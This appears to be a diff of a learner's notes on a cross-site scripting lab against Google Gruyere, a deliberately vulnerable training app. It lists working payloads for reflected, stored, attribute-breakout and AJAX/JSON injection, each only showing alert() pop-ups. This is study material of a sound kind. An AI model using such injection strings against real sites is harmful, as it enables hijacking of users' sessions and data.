@@ -1,10 +1,20 @@
+File Upload XSS
+Uplaod an html file containing harmful code then link the victim to it
 
+Reflected XSS
+(Add the <script>alert('....')</script> to the query string
+http://google-gruyere.appspot.com/449533261041/snippets.gtl?uid=cheddar%3Cscript%3Ealert(%2527Mwahahaa%2527)%3C%2Fscript%3E
 
+Stored XSS via post
+<b onmouseover="alert('Mouse')">Hello</b>
 
+Stored XSS via attribute
+Set the color to this, exployting that the value is just hard injected into it.
+#" onmouseover="alert(42)
 
-Stored XSS vs AJAX
+Stored XSS via AJAX
 The following string enters the attack
 ", foo: function() {alert("You got hacked");}(), bar: "
 The idea springs from the data structure returned in: http://google-gruyere.appspot.com/604177436824/feed.gtl?uid= (where the number is your profile number), where the JavaScript structure can be augmented with a one-shot-closure.
 
-
+Reflected XSS via AJAX
